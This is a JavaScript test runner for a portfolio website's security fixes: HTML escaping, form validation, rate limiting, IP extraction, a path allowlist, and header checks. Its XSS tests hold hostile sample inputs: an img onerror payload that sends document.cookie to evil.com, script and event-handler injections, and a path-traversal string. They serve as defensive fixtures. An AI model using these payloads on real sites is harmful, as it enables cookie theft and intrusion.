/**
 * Self-contained security test runner
 *
 * Requires ONLY Node.js (no npm install, no ts-jest, no jest).
 * Run from the 02 Build directory:
 *
 *   node __tests__/run-tests.js
 *
 * Tests every security function in pure JS.
 */

"use strict";

// ──────────────────────────────────────────────────────────────────────────────
// Tiny test harness
// ──────────────────────────────────────────────────────────────────────────────

let passed = 0;
let failed = 0;
const failures = [];

function test(label, fn) {
  try {
    fn();
    console.log(`  ✅  ${label}`);
    passed++;
  } catch (err) {
    console.log(`  ❌  ${label}`);
    console.log(`       → ${err.message}`);
    failed++;
    failures.push({ label, message: err.message });
  }
}

function describe(group, fn) {
  console.log(`\n📋  ${group}`);
  fn();
}

function expect(actual) {
  return {
    toBe(expected) {
      if (actual !== expected) {
        throw new Error(`Expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
      }
    },
    toContain(substring) {
      if (!String(actual).includes(substring)) {
        throw new Error(`Expected "${actual}" to contain "${substring}"`);
      }
    },
    not: {
      toContain(substring) {
        if (String(actual).includes(substring)) {
          throw new Error(`Expected "${actual}" NOT to contain "${substring}"`);
        }
      },
      toBe(expected) {
        if (actual === expected) {
          throw new Error(`Expected value NOT to be ${JSON.stringify(expected)}`);
        }
      },
    },
    toBeTruthy() {
      if (!actual) throw new Error(`Expected truthy, got ${actual}`);
    },
    toBeFalsy() {
      if (actual) throw new Error(`Expected falsy, got ${actual}`);
    },
    toBeGreaterThan(n) {
      if (!(actual > n)) throw new Error(`Expected ${actual} > ${n}`);
    },
  };
}

// ──────────────────────────────────────────────────────────────────────────────
// Functions under test (inline copies matching the source files exactly)
// ──────────────────────────────────────────────────────────────────────────────

/**
 * lib/email.ts → escapeHtml
 */
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

/**
 * lib/validation.ts — core rules (re-implemented in JS)
 */
function validateContactForm(data) {
  const errors = {};

  // name: 2–100 chars after trim
  if (typeof data.name !== "string") {
    errors.name = "Name must be a string";
  } else {
    const name = data.name.trim();
    if (name.length < 2) errors.name = "Name must be at least 2 characters";
    if (name.length > 100) errors.name = "Name must be less than 100 characters";
  }

  // email: valid format, ≤255 chars after trim
  if (typeof data.email !== "string") {
    errors.email = "Email must be a string";
  } else {
    const email = data.email.trim();
    const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRe.test(email)) errors.email = "Please enter a valid email address";
    if (email.length > 255) errors.email = "Email must be less than 255 characters";
  }

  // subject: 5–200 chars after trim
  if (typeof data.subject !== "string") {
    errors.subject = "Subject must be a string";
  } else {
    const subject = data.subject.trim();
    if (subject.length < 5) errors.subject = "Subject must be at least 5 characters";
    if (subject.length > 200) errors.subject = "Subject must be less than 200 characters";
  }

  // message: 10–5000 chars after trim
  if (typeof data.message !== "string") {
    errors.message = "Message must be a string";
  } else {
    const message = data.message.trim();
    if (message.length < 10) errors.message = "Message must be at least 10 characters";
    if (message.length > 5000) errors.message = "Message must be less than 5000 characters";
  }

  return {
    success: Object.keys(errors).length === 0,
    errors,
  };
}

/**
 * app/api/email/route.ts → getClientIp & checkRateLimit
 */
function getClientIp(headers) {
  const forwarded = headers["x-forwarded-for"];
  if (forwarded) {
    const parts = forwarded.split(",").map((s) => s.trim());
    return parts[parts.length - 1] || "unknown";
  }
  return headers["x-real-ip"] || "unknown";
}

const RATE_LIMIT = 5;
const RATE_LIMIT_WINDOW = 60 * 60 * 1000;

function makeStore() {
  return new Map();
}

function checkRateLimit(store, ip, now) {
  const record = store.get(ip);
  if (!record || now > record.resetTime) {
    store.set(ip, { count: 1, resetTime: now + RATE_LIMIT_WINDOW });
    return true;
  }
  if (record.count < RATE_LIMIT) {
    record.count++;
    return true;
  }
  return false;
}

/**
 * app/api/revalidate/route.ts → isAllowedPath
 */
const ALLOWED_PATHS = new Set(["/", "/api/email"]);
function isAllowedPath(path) {
  return ALLOWED_PATHS.has(path);
}

// ──────────────────────────────────────────────────────────────────────────────
// Security header verification (checks next.config.js source directly)
// ──────────────────────────────────────────────────────────────────────────────

const fs = require("fs");
const path = require("path");

const nextConfigPath = path.join(__dirname, "..", "next.config.js");
const nextConfigSrc = fs.readFileSync(nextConfigPath, "utf8");

const emailTemplatePath = path.join(__dirname, "..", "lib", "email.js");
// lib/email.ts won't be compiled to .js here, so we read the TS source instead
const emailSrcPath = path.join(__dirname, "..", "lib", "email.ts");
const emailSrc = fs.existsSync(emailSrcPath)
  ? fs.readFileSync(emailSrcPath, "utf8")
  : "";

const validationSrcPath = path.join(__dirname, "..", "lib", "validation.ts");
const validationSrc = fs.existsSync(validationSrcPath)
  ? fs.readFileSync(validationSrcPath, "utf8")
  : "";

const emailRoutePath = path.join(__dirname, "..", "app", "api", "email", "route.ts");
const emailRouteSrc = fs.existsSync(emailRoutePath)
  ? fs.readFileSync(emailRoutePath, "utf8")
  : "";

const revalidateRoutePath = path.join(__dirname, "..", "app", "api", "revalidate", "route.ts");
const revalidateRouteSrc = fs.existsSync(revalidateRoutePath)
  ? fs.readFileSync(revalidateRoutePath, "utf8")
  : "";

// ──────────────────────────────────────────────────────────────────────────────
// TEST SUITES
// ──────────────────────────────────────────────────────────────────────────────

console.log("\n════════════════════════════════════════════════════");
console.log("  PORTFOLIO SECURITY TEST SUITE");
console.log("════════════════════════════════════════════════════");

// ── Suite 1: escapeHtml ──────────────────────────────────────────────────────

describe("escapeHtml() — XSS prevention in email template", () => {
  test("escapes < and > (angle brackets)", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
  });

  test("escapes & (ampersand)", () => {
    expect(escapeHtml("AT&T")).toBe("AT&amp;T");
  });

  test('escapes " (double-quote)', () => {
    expect(escapeHtml('"hello"')).toBe("&quot;hello&quot;");
  });

  test("escapes ' (single-quote)", () => {
    expect(escapeHtml("it's")).toBe("it&#039;s");
  });

  test("leaves safe characters unchanged", () => {
    const safe = "Hello World 123 !@#$%^*()_+-=";
    expect(escapeHtml(safe)).toBe(safe);
  });

  test("handles empty string", () => {
    expect(escapeHtml("")).toBe("");
  });

  test("neutralises img onerror XSS payload", () => {
    const xss = `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`;
    const escaped = escapeHtml(xss);
    expect(escaped).not.toContain("<");
    expect(escaped).not.toContain(">");
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&lt;img");
  });

  test("neutralises script tag XSS payload", () => {
    const xss = "<script>alert('xss')</script>";
    const escaped = escapeHtml(xss);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  test("neutralises event-handler injection", () => {
    const xss = '" onmouseover="alert(1)';
    const escaped = escapeHtml(xss);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain("&quot;");
  });

  test("handles unicode without corruption", () => {
    const unicode = "Héllo café — ñoño";
    expect(escapeHtml(unicode)).toBe("Héllo café — ñoño");
  });

  test("escapeHtml is actually called in email.ts source", () => {
    // Verify the fix landed in the file (not just the tests)
    expect(emailSrc).toContain("escapeHtml(name)");
    expect(emailSrc).toContain("escapeHtml(email)");
    expect(emailSrc).toContain("escapeHtml(subject)");
    expect(emailSrc).toContain("escapeHtml(message)");
  });
});

// ── Suite 2: Validation ──────────────────────────────────────────────────────

describe("Contact Form Validation — Zod schema rules", () => {
  const valid = {
    name: "John Doe",
    email: "john@example.com",
    subject: "Hello there",
    message: "This is a valid message body.",
  };

  test("accepts a fully valid submission", () => {
    expect(validateContactForm(valid).success).toBe(true);
  });

  test("trims whitespace from name", () => {
    const r = validateContactForm({ ...valid, name: "  John  " });
    expect(r.success).toBe(true);
  });

  test("trims whitespace from email", () => {
    const r = validateContactForm({ ...valid, email: "  john@example.com  " });
    expect(r.success).toBe(true);
  });

  test("rejects name shorter than 2 chars", () => {
    expect(validateContactForm({ ...valid, name: "J" }).success).toBe(false);
  });

  test("rejects name longer than 100 chars", () => {
    expect(validateContactForm({ ...valid, name: "J".repeat(101) }).success).toBe(false);
  });

  test("accepts name exactly at minimum (2 chars)", () => {
    expect(validateContactForm({ ...valid, name: "Jo" }).success).toBe(true);
  });

  test("rejects malformed email — no domain", () => {
    expect(validateContactForm({ ...valid, email: "noatsign" }).success).toBe(false);
  });

  test("rejects malformed email — no TLD", () => {
    expect(validateContactForm({ ...valid, email: "a@b" }).success).toBe(false);
  });

  test("rejects subject shorter than 5 chars", () => {
    expect(validateContactForm({ ...valid, subject: "Hi" }).success).toBe(false);
  });

  test("rejects subject longer than 200 chars", () => {
    expect(validateContactForm({ ...valid, subject: "S".repeat(201) }).success).toBe(false);
  });

  test("rejects message shorter than 10 chars", () => {
    expect(validateContactForm({ ...valid, message: "Short" }).success).toBe(false);
  });

  test("rejects message longer than 5000 chars", () => {
    expect(validateContactForm({ ...valid, message: "M".repeat(5001) }).success).toBe(false);
  });

  test("accepts message exactly at 5000 chars (boundary)", () => {
    expect(validateContactForm({ ...valid, message: "M".repeat(5000) }).success).toBe(true);
  });

  test("rejects empty object", () => {
    expect(validateContactForm({}).success).toBe(false);
  });

  test("rejects null values in fields", () => {
    expect(validateContactForm({ ...valid, name: null }).success).toBe(false);
  });

  test("validation.ts has .trim() on email field", () => {
    expect(validationSrc).toContain(".trim()");
  });
});

// ── Suite 3: Rate Limiting ────────────────────────────────────────────────────

describe("Rate Limiting — checkRateLimit()", () => {
  const NOW = Date.now();

  test("allows first request", () => {
    const store = makeStore();
    expect(checkRateLimit(store, "1.2.3.4", NOW)).toBe(true);
  });

  test(`allows exactly ${RATE_LIMIT} requests`, () => {
    const store = makeStore();
    for (let i = 0; i < RATE_LIMIT; i++) {
      expect(checkRateLimit(store, "1.2.3.4", NOW)).toBe(true);
    }
  });

  test(`blocks the ${RATE_LIMIT + 1}th request`, () => {
    const store = makeStore();
    for (let i = 0; i < RATE_LIMIT; i++) checkRateLimit(store, "1.2.3.4", NOW);
    expect(checkRateLimit(store, "1.2.3.4", NOW)).toBe(false);
  });

  test("different IPs are tracked independently", () => {
    const store = makeStore();
    for (let i = 0; i < RATE_LIMIT; i++) checkRateLimit(store, "1.1.1.1", NOW);
    expect(checkRateLimit(store, "1.1.1.1", NOW)).toBe(false); // blocked
    expect(checkRateLimit(store, "2.2.2.2", NOW)).toBe(true);  // fresh
  });

  test("counter resets after the window expires", () => {
    const store = makeStore();
    for (let i = 0; i < RATE_LIMIT; i++) checkRateLimit(store, "1.2.3.4", NOW);
    expect(checkRateLimit(store, "1.2.3.4", NOW)).toBe(false); // blocked

    const afterWindow = NOW + RATE_LIMIT_WINDOW + 1;
    expect(checkRateLimit(store, "1.2.3.4", afterWindow)).toBe(true); // reset
  });
});

// ── Suite 4: IP Extraction ────────────────────────────────────────────────────

describe("IP Extraction — getClientIp() anti-spoofing", () => {
  test("reads LAST x-forwarded-for entry (edge IP, harder to spoof)", () => {
    const ip = getClientIp({ "x-forwarded-for": "1.2.3.4, 5.6.7.8, 99.99.99.99" });
    expect(ip).toBe("99.99.99.99");
  });

  test("handles single-entry x-forwarded-for", () => {
    const ip = getClientIp({ "x-forwarded-for": "10.0.0.1" });
    expect(ip).toBe("10.0.0.1");
  });

  test("trims spaces from entries", () => {
    const ip = getClientIp({ "x-forwarded-for": "  1.2.3.4  ,  5.6.7.8  " });
    expect(ip).toBe("5.6.7.8");
  });

  test("falls back to x-real-ip when x-forwarded-for absent", () => {
    const ip = getClientIp({ "x-forwarded-for": null, "x-real-ip": "10.20.30.40" });
    expect(ip).toBe("10.20.30.40");
  });

  test("returns 'unknown' when both headers absent", () => {
    const ip = getClientIp({ "x-forwarded-for": null, "x-real-ip": null });
    expect(ip).toBe("unknown");
  });

  test("does NOT use the first (client-spoofable) entry", () => {
    // Old vulnerable behaviour was to use [0]
    const ip = getClientIp({ "x-forwarded-for": "SPOOFED.IP.123.4, 5.6.7.8, real.edge.ip" });
    expect(ip).not.toBe("SPOOFED.IP.123.4");
    expect(ip).toBe("real.edge.ip");
  });
});

// ── Suite 5: Path Allowlist (Revalidate) ─────────────────────────────────────

describe("Revalidate Path Allowlist — isAllowedPath()", () => {
  test("allows root /", () => {
    expect(isAllowedPath("/")).toBe(true);
  });

  test("allows /api/email", () => {
    expect(isAllowedPath("/api/email")).toBe(true);
  });

  test("rejects /admin", () => {
    expect(isAllowedPath("/admin")).toBe(false);
  });

  test("rejects path traversal /../../../etc/passwd", () => {
    expect(isAllowedPath("/../../../etc/passwd")).toBe(false);
  });

  test("rejects empty string", () => {
    expect(isAllowedPath("")).toBe(false);
  });

  test("rejects /api/revalidate (self-referential abuse)", () => {
    expect(isAllowedPath("/api/revalidate")).toBe(false);
  });

  test("is case-sensitive", () => {
    expect(isAllowedPath("/API/EMAIL")).toBe(false);
  });
});

// ── Suite 6: Source-level security checks ────────────────────────────────────

describe("Source Code Checks — verifying fixes exist in files", () => {
  test("next.config.js has Content-Security-Policy header", () => {
    expect(nextConfigSrc).toContain("Content-Security-Policy");
  });

  test("next.config.js has Strict-Transport-Security header", () => {
    expect(nextConfigSrc).toContain("Strict-Transport-Security");
  });

  test("next.config.js CSP contains frame-ancestors 'none'", () => {
    expect(nextConfigSrc).toContain("frame-ancestors 'none'");
  });

  test("next.config.js CSP contains form-action 'self'", () => {
    expect(nextConfigSrc).toContain("form-action 'self'");
  });

  test("next.config.js CSP allows Sanity CDN for images", () => {
    expect(nextConfigSrc).toContain("cdn.sanity.io");
  });

  test("next.config.js has X-Content-Type-Options", () => {
    expect(nextConfigSrc).toContain("X-Content-Type-Options");
  });

  test("next.config.js has X-Frame-Options", () => {
    expect(nextConfigSrc).toContain("X-Frame-Options");
  });

  test("next.config.js has Referrer-Policy", () => {
    expect(nextConfigSrc).toContain("Referrer-Policy");
  });

  test("next.config.js has Permissions-Policy", () => {
    expect(nextConfigSrc).toContain("Permissions-Policy");
  });

  test("email route returns generic 500 message (no internal leak)", () => {
    expect(emailRouteSrc).toContain("An error occurred. Please try again later.");
    expect(emailRouteSrc).not.toContain('"Failed to send email"');
  });

  test("email route checks Content-Type before parsing body", () => {
    expect(emailRouteSrc).toContain("application/json");
  });

  test("email route uses last x-forwarded-for entry (anti-spoofing)", () => {
    expect(emailRouteSrc).toContain("parts[parts.length - 1]");
  });

  test("revalidate route rejects GET with 405", () => {
    expect(revalidateRouteSrc).toContain("405");
  });

  test("revalidate route has ALLOWED_PATHS allowlist", () => {
    expect(revalidateRouteSrc).toContain("ALLOWED_PATHS");
  });

  test("revalidate route returns 401 on bad secret", () => {
    expect(revalidateRouteSrc).toContain("401");
  });
});

// ──────────────────────────────────────────────────────────────────────────────
// Summary
// ──────────────────────────────────────────────────────────────────────────────

console.log("\n════════════════════════════════════════════════════");
console.log("  RESULTS");
console.log("════════════════════════════════════════════════════");
console.log(`  Total:   ${passed + failed}`);
console.log(`  Passed:  ${passed} ✅`);
console.log(`  Failed:  ${failed} ${failed > 0 ? "❌" : "✅"}`);

if (failures.length > 0) {
  console.log("\n  FAILURES:");
  for (const f of failures) {
    console.log(`  ❌ ${f.label}`);
    console.log(`     ${f.message}`);
  }
}

console.log("");

if (failed > 0) {
  process.exit(1);
} else {
  console.log("  All security tests passed. ✅");
}
